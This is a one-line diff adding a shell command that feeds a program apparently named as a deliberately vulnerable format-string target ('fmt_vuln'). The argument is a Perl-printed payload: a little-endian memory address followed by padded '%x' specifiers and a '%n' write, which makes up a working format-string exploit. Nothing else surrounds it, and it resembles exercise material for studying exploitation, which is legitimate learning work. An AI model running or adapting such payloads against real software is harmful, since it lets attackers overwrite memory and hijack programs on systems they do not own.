@@ -1,0 +1,1 @@
+./fmt_vuln  `perl -e 'print("\x70\x96\x04\x08%254x%265x%265x%n");'` 
